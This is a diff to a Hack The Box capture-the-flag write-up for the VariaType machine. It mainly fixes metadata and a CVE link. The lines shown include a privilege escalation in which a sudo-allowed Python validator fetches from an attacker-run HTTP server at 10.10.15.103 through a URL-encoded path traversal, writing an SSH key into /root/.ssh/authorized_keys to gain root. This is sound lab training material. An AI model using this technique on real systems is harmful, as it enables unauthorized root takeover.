@@ -1,12 +1,13 @@
 ---
 title: VariaType
+machine: VariaType
 date: 2026-05-01
 category: [HackTheBox, Linux]
 tags: [nmap, ffuf]
 difficulty: Medium
 platform: HackTheBox
 os: Linux
-summary: VariaType is an medium rated box on Hack The Box
+summary: VariaType is a medium rated box on Hack The Box
 machine_url: https://app.hackthebox.com/machines/VariaType
 achievement: https://labs.hackthebox.com/achievement/machine/1737280/850
 ---
@@ -193,7 +194,7 @@ User steve may run the following commands on variatype:
     (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
 ```
 steve allowed to run that as root with no password.
-## [CVE-2025-47273]()
+## [CVE-2025-47273](https://github.com/advisories/GHSA-5rjg-fvgr-3xxf)
 ```python
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import sys
@@ -214,7 +215,9 @@ HTTPServer(('0.0.0.0', port), MinimalHandler).serve_forever()
 ```
 Set up a http server that will always return my public key for GET requests.
 ```bash
-sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys2026-05-01 02:35:23,270 [INFO] Attempting to install plugin from: http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys
+sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys2026-05-01 
+
+02:35:23,270 [INFO] Attempting to install plugin from: http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys
 2026-05-01 02:35:23,285 [INFO] Downloading http://10.10.15.103:8000/%2froot%2f.ssh%2fauthorized_keys
 2026-05-01 02:35:23,651 [INFO] Plugin installed at: /root/.ssh/authorized_keys
 [+] Plugin installed successfully.
@@ -236,5 +239,3 @@ root@variatype:~# whoami
 root
 ```
 ![](/images/Pasted%20image%2020260503113311.png)
-# Summary
-# Remediation
